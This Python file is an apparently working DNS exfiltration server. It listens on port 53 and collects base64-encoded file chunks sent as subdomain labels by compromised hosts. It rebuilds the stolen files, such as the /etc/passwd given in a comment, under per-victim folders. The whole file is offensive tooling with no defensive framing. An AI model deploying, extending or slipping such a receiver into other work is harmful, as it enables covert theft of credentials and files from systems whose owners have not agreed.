import os
import base64
from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, QTYPE, A

class ExfiltrationResolver(BaseResolver):
    sessions = {}

    def resolve(self, request, handler):
        qname = str(request.q.qname).strip(".")
        labels = qname.split(".")
        src_ip = handler.client_address[0]

        print(f"[+] Query from {src_ip}: {qname}")
        base_dir = f"exfil_data/{src_ip}"
        os.makedirs(base_dir, exist_ok=True)

        if labels[0] == "path":
            # e.g. path.etc_passwd.exfil.dns.local
            encoded_path = labels[1]
            file_path = encoded_path.replace("_", "/")
            self.sessions[src_ip] = {
                "path": file_path,
                "chunks": {},
                "last_chunk": -1
            }
            print(f"[+] Session started for {src_ip}, file path: {file_path}")

        elif labels[0] == "eof":
            print(f"[✓] EOF received from {src_ip}, writing file...")
            self.flush_chunks_to_file(src_ip)

        elif src_ip in self.sessions:
            session = self.sessions[src_ip]
            try:
                print(f"[DEBUG] labels: {labels}")
                index = int(labels[1])                # <chunk>.<index>.<domain>
                chunk_str = labels[0]
                padded = chunk_str + "=" * ((4 - len(chunk_str) % 4) % 4)
                decoded = base64.urlsafe_b64decode(padded)

                session["chunks"][index] = decoded
                session["last_chunk"] = max(session["last_chunk"], index)
                print(f"[✓] Stored chunk {index}, {len(decoded)} bytes")

            except Exception as e:
                print(f"[!] Failed to process chunk from {src_ip}: {e}")
        else:
            print(f"[!] No active session for IP {src_ip}")

        reply = request.reply()
        reply.add_answer(RR(
            rname=request.q.qname,
            rtype=QTYPE.A,
            rclass=1,
            ttl=60,
            rdata=A("127.0.0.1")
        ))
        return reply

    def flush_chunks_to_file(self, ip):
        session = self.sessions.get(ip)
        if not session:
            print(f"[!] No session to flush for {ip}")
            return

        full_path = os.path.join("exfil_data", ip, session["path"].lstrip("/"))
        os.makedirs(os.path.dirname(full_path), exist_ok=True)

        with open(full_path, "wb") as f:
            for i in range(session["last_chunk"] + 1):
                chunk = session["chunks"].get(i)
                if chunk:
                    print(f"[DEBUG] Writing chunk {i}, {len(chunk)} bytes")
                    f.write(chunk)
                else:
                    print(f"[!] Missing chunk {i}")

        print(f"[✓] File written to: {full_path}")

if __name__ == "__main__":
    resolver = ExfiltrationResolver()
    udp_server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)
    tcp_server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=True)

    print("[*] DNS server started on port 53 (UDP + TCP)")
    udp_server.start_thread()
    tcp_server.start_thread()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C received.")

